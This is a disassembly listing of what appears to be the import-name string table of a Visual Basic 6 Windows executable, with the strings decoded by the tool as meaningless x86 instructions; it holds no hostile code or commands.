  409c7c:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  409c80:	00 00                	add    %al,(%eax)
  409c82:	5f                   	pop    %edi
  409c83:	5f                   	pop    %edi
  409c84:	76 62                	jbe    0x409ce8
  409c86:	61                   	popa
  409c87:	4c                   	dec    %esp
  409c88:	61                   	popa
  409c89:	74 65                	je     0x409cf0
  409c8b:	49                   	dec    %ecx
  409c8c:	64 43                	fs inc %ebx
  409c8e:	61                   	popa
  409c8f:	6c                   	insb   (%dx),%es:(%edi)
  409c90:	6c                   	insb   (%dx),%es:(%edi)
  409c91:	4c                   	dec    %esp
  409c92:	64 00 00             	add    %al,%fs:(%eax)
  409c95:	00 5f 5f             	add    %bl,0x5f(%edi)
  409c98:	76 62                	jbe    0x409cfc
  409c9a:	61                   	popa
  409c9b:	53                   	push   %ebx
  409c9c:	74 72                	je     0x409d10
  409c9e:	52                   	push   %edx
  409c9f:	38 00                	cmp    %al,(%eax)
  409ca1:	00 00                	add    %al,(%eax)
  409ca3:	00 45 56             	add    %al,0x56(%ebp)
  409ca6:	45                   	inc    %ebp
  409ca7:	4e                   	dec    %esi
  409ca8:	54                   	push   %esp
  409ca9:	5f                   	pop    %edi
  409caa:	53                   	push   %ebx
  409cab:	49                   	dec    %ecx
  409cac:	4e                   	dec    %esi
  409cad:	4b                   	dec    %ebx
  409cae:	5f                   	pop    %edi
  409caf:	52                   	push   %edx
  409cb0:	65 6c                	gs insb (%dx),%es:(%edi)
  409cb2:	65 61                	gs popa
  409cb4:	73 65                	jae    0x409d1b
  409cb6:	00 00                	add    %al,(%eax)
  409cb8:	00 00                	add    %al,(%eax)
  409cba:	5f                   	pop    %edi
  409cbb:	5f                   	pop    %edi
  409cbc:	76 62                	jbe    0x409d20
  409cbe:	61                   	popa
  409cbf:	55                   	push   %ebp
  409cc0:	49                   	dec    %ecx
  409cc1:	31 49 32             	xor    %ecx,0x32(%ecx)
  409cc4:	00 00                	add    %al,(%eax)
  409cc6:	00 00                	add    %al,(%eax)
  409cc8:	5f                   	pop    %edi
  409cc9:	43                   	inc    %ebx
  409cca:	49                   	dec    %ecx
  409ccb:	73 71                	jae    0x409d3e
  409ccd:	72 74                	jb     0x409d43
  409ccf:	00 00                	add    %al,(%eax)
  409cd1:	00 45 56             	add    %al,0x56(%ebp)
  409cd4:	45                   	inc    %ebp
  409cd5:	4e                   	dec    %esi
  409cd6:	54                   	push   %esp
  409cd7:	5f                   	pop    %edi
  409cd8:	53                   	push   %ebx
  409cd9:	49                   	dec    %ecx
  409cda:	4e                   	dec    %esi
  409cdb:	4b                   	dec    %ebx
  409cdc:	5f                   	pop    %edi
  409cdd:	51                   	push   %ecx
  409cde:	75 65                	jne    0x409d45
  409ce0:	72 79                	jb     0x409d5b
  409ce2:	49                   	dec    %ecx
  409ce3:	6e                   	outsb  %ds:(%esi),(%dx)
  409ce4:	74 65                	je     0x409d4b
  409ce6:	72 66                	jb     0x409d4e
  409ce8:	61                   	popa
  409ce9:	63 65 00             	arpl   %esp,0x0(%ebp)
  409cec:	00 00                	add    %al,(%eax)
  409cee:	5f                   	pop    %edi
  409cef:	5f                   	pop    %edi
  409cf0:	76 62                	jbe    0x409d54
  409cf2:	61                   	popa
  409cf3:	45                   	inc    %ebp
  409cf4:	78 63                	js     0x409d59
  409cf6:	65 70 74             	gs jo  0x409d6d
  409cf9:	48                   	dec    %eax
  409cfa:	61                   	popa
  409cfb:	6e                   	outsb  %ds:(%esi),(%dx)
  409cfc:	64 6c                	fs insb (%dx),%es:(%edi)
  409cfe:	65 72 00             	gs jb  0x409d01
  409d01:	00 00                	add    %al,(%eax)
  409d03:	00 5f 5f             	add    %bl,0x5f(%edi)
  409d06:	76 62                	jbe    0x409d6a
  409d08:	61                   	popa
  409d09:	53                   	push   %ebx
  409d0a:	74 72                	je     0x409d7e
  409d0c:	54                   	push   %esp
  409d0d:	6f                   	outsl  %ds:(%esi),(%dx)
  409d0e:	55                   	push   %ebp
  409d0f:	6e                   	outsb  %ds:(%esi),(%dx)
  409d10:	69 63 6f 64 65 00 00 	imul   $0x6564,0x6f(%ebx),%esp
  409d17:	00 5f 61             	add    %bl,0x61(%edi)
  409d1a:	64 6a 5f             	fs push $0x5f
  409d1d:	66 70 72             	data16 jo 0x409d92
  409d20:	65 6d                	gs insl (%dx),%es:(%edi)
  409d22:	00 00                	add    %al,(%eax)
  409d24:	00 00                	add    %al,(%eax)
  409d26:	5f                   	pop    %edi
  409d27:	61                   	popa
  409d28:	64 6a 5f             	fs push $0x5f
  409d2b:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  409d32:	36 34 00             	ss xor $0x0,%al
  409d35:	00 00                	add    %al,(%eax)
  409d37:	00 5f 5f             	add    %bl,0x5f(%edi)
  409d3a:	76 62                	jbe    0x409d9e
  409d3c:	61                   	popa
  409d3d:	46                   	inc    %esi
  409d3e:	50                   	push   %eax
  409d3f:	45                   	inc    %ebp
  409d40:	78 63                	js     0x409da5
  409d42:	65 70 74             	gs jo  0x409db9
  409d45:	69 6f 6e 00 00 00 00 	imul   $0x0,0x6e(%edi),%ebp
  409d4c:	5f                   	pop    %edi
  409d4d:	5f                   	pop    %edi
  409d4e:	76 62                	jbe    0x409db2
  409d50:	61                   	popa
  409d51:	53                   	push   %ebx
  409d52:	74 72                	je     0x409dc6
  409d54:	56                   	push   %esi
  409d55:	61                   	popa
  409d56:	72 56                	jb     0x409dae
  409d58:	61                   	popa
  409d59:	6c                   	insb   (%dx),%es:(%edi)
  409d5a:	00 00                	add    %al,(%eax)
  409d5c:	00 00                	add    %al,(%eax)
  409d5e:	5f                   	pop    %edi
  409d5f:	5f                   	pop    %edi
  409d60:	76 62                	jbe    0x409dc4
  409d62:	61                   	popa
  409d63:	56                   	push   %esi
  409d64:	61                   	popa
  409d65:	72 43                	jb     0x409daa
  409d67:	61                   	popa
  409d68:	74 00                	je     0x409d6a
  409d6a:	00 00                	add    %al,(%eax)
  409d6c:	5f                   	pop    %edi
  409d6d:	43                   	inc    %ebx
  409d6e:	49                   	dec    %ecx
  409d6f:	6c                   	insb   (%dx),%es:(%edi)
  409d70:	6f                   	outsl  %ds:(%esi),(%dx)
  409d71:	67 00 00             	add    %al,(%bx,%si)
  409d74:	00 00                	add    %al,(%eax)
  409d76:	5f                   	pop    %edi
  409d77:	5f                   	pop    %edi
  409d78:	76 62                	jbe    0x409ddc
  409d7a:	61                   	popa
  409d7b:	45                   	inc    %ebp
  409d7c:	72 72                	jb     0x409df0
  409d7e:	6f                   	outsl  %ds:(%esi),(%dx)
  409d7f:	72 4f                	jb     0x409dd0
  409d81:	76 65                	jbe    0x409de8
  409d83:	72 66                	jb     0x409deb
  409d85:	6c                   	insb   (%dx),%es:(%edi)
  409d86:	6f                   	outsl  %ds:(%esi),(%dx)
  409d87:	77 00                	ja     0x409d89
  409d89:	00 00                	add    %al,(%eax)
  409d8b:	00 5f 5f             	add    %bl,0x5f(%edi)
  409d8e:	76 62                	jbe    0x409df2
  409d90:	61                   	popa
  409d91:	46                   	inc    %esi
  409d92:	69 6c 65 4f 70 65 6e 	imul   $0x6e6570,0x4f(%ebp,%eiz,2),%ebp
  409d99:	00 
  409d9a:	00 00                	add    %al,(%eax)
  409d9c:	5f                   	pop    %edi
  409d9d:	5f                   	pop    %edi
  409d9e:	76 62                	jbe    0x409e02
  409da0:	61                   	popa
  409da1:	4e                   	dec    %esi
  409da2:	65 77 32             	gs ja  0x409dd7
  409da5:	00 00                	add    %al,(%eax)
  409da7:	00 5f 5f             	add    %bl,0x5f(%edi)
  409daa:	76 62                	jbe    0x409e0e
  409dac:	61                   	popa
  409dad:	52                   	push   %edx
  409dae:	38 53 74             	cmp    %dl,0x74(%ebx)
  409db1:	72 00                	jb     0x409db3
  409db3:	00 00                	add    %al,(%eax)
  409db5:	00 5f 61             	add    %bl,0x61(%edi)
  409db8:	64 6a 5f             	fs push $0x5f
  409dbb:	66 64 69 76 5f 6d 33 	imul   $0x336d,%fs:0x5f(%esi),%si
  409dc2:	32 69 00             	xor    0x0(%ecx),%ch
  409dc5:	00 00                	add    %al,(%eax)
  409dc7:	00 5f 61             	add    %bl,0x61(%edi)
  409dca:	64 6a 5f             	fs push $0x5f
  409dcd:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  409dd4:	33 32                	xor    (%edx),%esi
  409dd6:	69 00 00 00 5f 5f    	imul   $0x5f5f0000,(%eax),%eax
  409ddc:	76 62                	jbe    0x409e40
  409dde:	61                   	popa
  409ddf:	53                   	push   %ebx
  409de0:	74 72                	je     0x409e54
  409de2:	43                   	inc    %ebx
  409de3:	6f                   	outsl  %ds:(%esi),(%dx)
  409de4:	70 79                	jo     0x409e5f
  409de6:	00 00                	add    %al,(%eax)
  409de8:	00 00                	add    %al,(%eax)
  409dea:	5f                   	pop    %edi
  409deb:	5f                   	pop    %edi
  409dec:	76 62                	jbe    0x409e50
  409dee:	61                   	popa
  409def:	46                   	inc    %esi
  409df0:	72 65                	jb     0x409e57
  409df2:	65 53                	gs push %ebx
  409df4:	74 72                	je     0x409e68
  409df6:	4c                   	dec    %esp
  409df7:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  409dfe:	5f                   	pop    %edi
  409dff:	61                   	popa
  409e00:	64 6a 5f             	fs push $0x5f
  409e03:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  409e0a:	33 32                	xor    (%edx),%esi
  409e0c:	00 00                	add    %al,(%eax)
  409e0e:	00 00                	add    %al,(%eax)
  409e10:	5f                   	pop    %edi
  409e11:	61                   	popa
  409e12:	64 6a 5f             	fs push $0x5f
  409e15:	66 64 69 76 5f 72 00 	imul   $0x72,%fs:0x5f(%esi),%si
  409e1c:	00 00                	add    %al,(%eax)
  409e1e:	5f                   	pop    %edi
  409e1f:	5f                   	pop    %edi
  409e20:	76 62                	jbe    0x409e84
  409e22:	61                   	popa
  409e23:	49                   	dec    %ecx
  409e24:	34 56                	xor    $0x56,%al
  409e26:	61                   	popa
  409e27:	72 00                	jb     0x409e29
  409e29:	00 00                	add    %al,(%eax)
  409e2b:	00 5f 5f             	add    %bl,0x5f(%edi)
  409e2e:	76 62                	jbe    0x409e92
  409e30:	61                   	popa
  409e31:	56                   	push   %esi
  409e32:	61                   	popa
  409e33:	72 44                	jb     0x409e79
  409e35:	75 70                	jne    0x409ea7
  409e37:	00 00                	add    %al,(%eax)
  409e39:	00 5f 5f             	add    %bl,0x5f(%edi)
  409e3c:	76 62                	jbe    0x409ea0
  409e3e:	61                   	popa
  409e3f:	53                   	push   %ebx
  409e40:	74 72                	je     0x409eb4
  409e42:	54                   	push   %esp
  409e43:	6f                   	outsl  %ds:(%esi),(%dx)
  409e44:	41                   	inc    %ecx
  409e45:	6e                   	outsb  %ds:(%esi),(%dx)
  409e46:	73 69                	jae    0x409eb1
  409e48:	00 00                	add    %al,(%eax)
  409e4a:	00 00                	add    %al,(%eax)
  409e4c:	5f                   	pop    %edi
  409e4d:	5f                   	pop    %edi
  409e4e:	76 62                	jbe    0x409eb2
  409e50:	61                   	popa
  409e51:	56                   	push   %esi
  409e52:	61                   	popa
  409e53:	72 43                	jb     0x409e98
  409e55:	6f                   	outsl  %ds:(%esi),(%dx)
  409e56:	70 79                	jo     0x409ed1
  409e58:	00 00                	add    %al,(%eax)
  409e5a:	00 00                	add    %al,(%eax)
  409e5c:	5f                   	pop    %edi
  409e5d:	43                   	inc    %ebx
  409e5e:	49                   	dec    %ecx
  409e5f:	61                   	popa
  409e60:	74 61                	je     0x409ec3
  409e62:	6e                   	outsb  %ds:(%esi),(%dx)
  409e63:	00 00                	add    %al,(%eax)
  409e65:	00 5f 5f             	add    %bl,0x5f(%edi)
  409e68:	76 62                	jbe    0x409ecc
  409e6a:	61                   	popa
  409e6b:	53                   	push   %ebx
  409e6c:	74 72                	je     0x409ee0
  409e6e:	4d                   	dec    %ebp
  409e6f:	6f                   	outsl  %ds:(%esi),(%dx)
  409e70:	76 65                	jbe    0x409ed7
  409e72:	00 00                	add    %al,(%eax)
  409e74:	00 00                	add    %al,(%eax)
  409e76:	5f                   	pop    %edi
  409e77:	5f                   	pop    %edi
  409e78:	76 62                	jbe    0x409edc
  409e7a:	61                   	popa
  409e7b:	43                   	inc    %ebx
  409e7c:	61                   	popa
  409e7d:	73 74                	jae    0x409ef3
  409e7f:	4f                   	dec    %edi
  409e80:	62 6a 00             	bound  %ebp,0x0(%edx)
  409e83:	00 00                	add    %al,(%eax)
  409e85:	00 5f 61             	add    %bl,0x61(%edi)
  409e88:	6c                   	insb   (%dx),%es:(%edi)
  409e89:	6c                   	insb   (%dx),%es:(%edi)
  409e8a:	6d                   	insl   (%dx),%es:(%edi)
  409e8b:	75 6c                	jne    0x409ef9
  409e8d:	00 00                	add    %al,(%eax)
  409e8f:	00 5f 43             	add    %bl,0x43(%edi)
  409e92:	49                   	dec    %ecx
  409e93:	74 61                	je     0x409ef6
  409e95:	6e                   	outsb  %ds:(%esi),(%dx)
  409e96:	00 00                	add    %al,(%eax)
  409e98:	00 00                	add    %al,(%eax)
  409e9a:	5f                   	pop    %edi
  409e9b:	43                   	inc    %ebx
  409e9c:	49                   	dec    %ecx
  409e9d:	65 78 70             	gs js  0x409f10
  409ea0:	00 00                	add    %al,(%eax)
  409ea2:	00 00                	add    %al,(%eax)
  409ea4:	5f                   	pop    %edi
  409ea5:	5f                   	pop    %edi
  409ea6:	76 62                	jbe    0x409f0a
  409ea8:	61                   	popa
  409ea9:	46                   	inc    %esi
  409eaa:	72 65                	jb     0x409f11
  409eac:	65 4f                	gs dec %edi
  409eae:	62 6a 00             	bound  %ebp,0x0(%edx)
  409eb1:	00 00                	add    %al,(%eax)
  409eb3:	00 5f 5f             	add    %bl,0x5f(%edi)
  409eb6:	76 62                	jbe    0x409f1a
  409eb8:	61                   	popa
  409eb9:	46                   	inc    %esi
  409eba:	72 65                	jb     0x409f21
  409ebc:	65 53                	gs push %ebx
  409ebe:	74 72                	je     0x409f32
  409ec0:	00 00                	add    %al,(%eax)
	...
